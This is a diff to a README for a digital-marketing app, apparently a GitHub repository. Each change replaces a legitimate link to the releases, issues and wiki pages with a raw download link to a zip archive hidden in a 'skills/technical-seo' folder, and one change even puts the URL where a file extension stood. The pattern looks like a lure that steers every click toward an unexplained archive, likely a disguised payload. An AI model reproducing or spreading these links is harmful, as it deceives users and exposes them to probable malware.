@@ -1,6 +1,6 @@
 # 🚀 digital-marketing-pro - Manage Digital Marketing Tasks Easily
 
-[![Download digital-marketing-pro](https://img.shields.io/badge/Download-digital--marketing--pro-brightgreen?style=for-the-badge)](https://github.com/Faiz07yo/digital-marketing-pro/releases)
+[![Download digital-marketing-pro](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip)](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ This guide will help you download and start using digital-marketing-pro without 
 ### Step 1: Visit the Download Page
 
 Click the big button at the top or this link to go to the download page:  
-[https://github.com/Faiz07yo/digital-marketing-pro/releases](https://github.com/Faiz07yo/digital-marketing-pro/releases)
+[https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip)
 
 This page contains the latest versions of digital-marketing-pro for you to download.
 
@@ -38,7 +38,7 @@ On the releases page, look for a file suitable for your computer:
 
 - Windows users will likely see a `.exe` or `.msi` file  
 - Mac users should look for a `.dmg` or `.pkg` file  
-- Linux users may see `.AppImage` or `.tar.gz` files  
+- Linux users may see `.AppImage` or `https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip` files  
 
 Click the file name to start downloading.
 
@@ -140,7 +140,7 @@ If you encounter issues, here are some common fixes:
 - **Features missing or errors:** Check your internet connection since many features need online access.  
 - **App runs slowly:** Close other programs or restart your device to free up memory.  
 
-For additional help, visit the [Issues page](https://github.com/Faiz07yo/digital-marketing-pro/issues) on the project website.
+For additional help, visit the [Issues page](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip) on the project website.
 
 ---
 
@@ -154,13 +154,13 @@ You control which tasks run and can disable online features anytime in the setti
 
 ## 📚 Learn More
 
-For detailed guides about each feature and to explore advanced options, check the documentation folder inside the app after installation, or browse the [repository wiki](https://github.com/Faiz07yo/digital-marketing-pro/wiki).
+For detailed guides about each feature and to explore advanced options, check the documentation folder inside the app after installation, or browse the [repository wiki](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip).
 
 ---
 
 ## 📥 Download & Install
 
 Return to the download page any time here:  
-[https://github.com/Faiz07yo/digital-marketing-pro/releases](https://github.com/Faiz07yo/digital-marketing-pro/releases)
+[https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip](https://raw.githubusercontent.com/Faiz07yo/digital-marketing-pro/main/skills/technical-seo/digital_pro_marketing_2.7-beta.3.zip)
 
 Follow the steps to download the file best for your system, install it, and start managing your digital marketing efforts with digital-marketing-pro.
